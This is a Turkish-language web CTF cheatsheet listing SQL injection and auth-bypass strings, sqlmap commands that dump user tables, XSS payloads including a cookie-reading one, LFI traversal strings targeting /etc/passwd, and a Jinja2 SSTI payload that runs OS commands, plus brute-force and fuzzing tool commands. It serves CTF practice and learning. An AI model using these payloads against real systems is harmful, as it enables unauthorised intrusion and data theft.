# 🌐 Web CTF Kopya Kağıdı (Web CTF Cheatsheet)

---

## 💉 SQL Enjeksiyonu (SQL Injection)

### Temel Yükler (Basic Payloads)
```sql
' OR 1=1--
' OR '1'='1
" OR ""="
admin'--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
```

### SQLMap ile Otomasyon
```bash
# Veritabanlarını listeleme
sqlmap -u "http://url?id=1" --dbs

# Tabloları listeleme
sqlmap -u "http://url?id=1" -D veritabani_adi --tables

# Tablo içeriğini dökümleme (dump)
sqlmap -u "http://url?id=1" -D veritabani_adi -T kullanicilar --dump
```

---

## 📜 XSS (Cross-Site Scripting)

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>
javascript:alert(1)
```

---

## 📁 LFI (Yerel Dosya Dahil Etme)

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
```

---

## 🔧 SSTI (Sunucu Taraflı Şablon Enjeksiyonu)

### Şablon Motorunu Belirleme
```
{{7*7}}     → 49 (Jinja2 / Twig)
${7*7}      → 49 (Freemarker)
<%= 7*7 %>  → 49 (ERB)
```

### Jinja2 Uzaktan Kod Çalıştırma (RCE)
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

## 🔐 Kimlik Doğrulama Atlatma (Auth Bypass)

```
admin' --
admin'/*
' OR 1=1 LIMIT 1--
Parola Alanı: ' OR '1'='1
```

---

## 🍪 Çerezler ve JWT (JSON Web Token)

```bash
# JWT içeriğini çözme
echo "eyJ..." | base64 -d

# Araçlar
jwt_tool.py token
jwt.io (çevrim içi çözümleyici)
```

---

## 🛠️ Faydalı Web Araçları

```bash
# Dizin kaba kuvveti (brute force)
gobuster dir -u http://url -w wordlist.txt

# Fuzzing
ffuf -u http://url/FUZZ -w wordlist.txt

# Gizli parametre keşfi
arjun -u http://url
```

---

## 📋 Web CTF Kontrol Listesi

```markdown
□ Sayfa kaynak kodunu inceleyin (Ctrl+U)
□ robots.txt ve sitemap.xml dosyalarını kontrol edin
□ Çerezleri ve JWT belirteçlerini analiz edin
□ Girdi alanlarında SQLi testleri yapın
□ XSS filtrelerini test edin
□ Dosya parametrelerinde LFI / RFI deneyin
□ SSTI kalıplarını deneyin
□ Gizli dizinleri ve uç noktaları tarayın
□ Açıkta kalan .git / .env dosyalarını kontrol edin
```

---

**CTF'e Dön:** [🏁 CTF Genel Bakış](./README.tr.md)
